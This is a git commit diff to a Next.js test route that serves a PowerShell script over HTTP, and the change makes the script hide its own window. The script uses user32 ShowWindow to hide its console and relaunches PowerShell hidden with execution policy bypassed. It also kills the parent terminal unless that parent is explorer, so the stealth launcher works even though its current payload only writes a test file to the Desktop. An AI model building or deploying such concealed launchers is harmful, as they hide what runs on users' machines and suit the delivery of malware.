0448e1e44228e47b1a9a8252d009c52224fa529b
kaliiiiiiiiii <aurinliun@gmx.ch>
2024-08-05 15:45:57 +0200

    autohide window

--- app/test/route.ts
+++ app/test/route.ts
@@ -2,17 +2,18 @@ import { NextRequest, NextResponse } from 'next/server';
 
 export async function GET(req: NextRequest) {
     const script = `
-    $script = {
-        Start-Sleep -Seconds 5
-        Add-Content -Path ([Environment]::GetFolderPath('Desktop')+'/a.txt') -Value test
-        Read-Host
+add-type -name user32 -namespace win32 -memberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+[win32.user32]::showWindow((get-process -id $pid).mainWindowHandle, 0);
+$script = {
+    Start-Sleep -Seconds 5
+    Add-Content -Path ([Environment]::GetFolderPath('Desktop')+'/a.txt') -Value test
+    Read-Host
     }
-    Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString());
-    $proc = [System.Diagnostics.Process]::GetCurrentProcess()
-    $parent = Get-Process -Id (gwmi win32_process | ? processid -eq  $proc.Id).parentprocessid
-    if($parent.ProcessName -ne "explorer"){Stop-Process -InputObject $parent -Force};
-    Exit
-    `
+Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString());
+$proc = [System.Diagnostics.Process]::GetCurrentProcess()
+$parent = Get-Process -Id (gwmi win32_process | ? processid -eq  $proc.Id).parentprocessid
+if($parent.ProcessName -ne "explorer"){Stop-Process -InputObject $parent -Force};
+Exit`
   return new NextResponse(script, {
     status: 200,
     headers: { 'Content-Type': 'text/plain' }
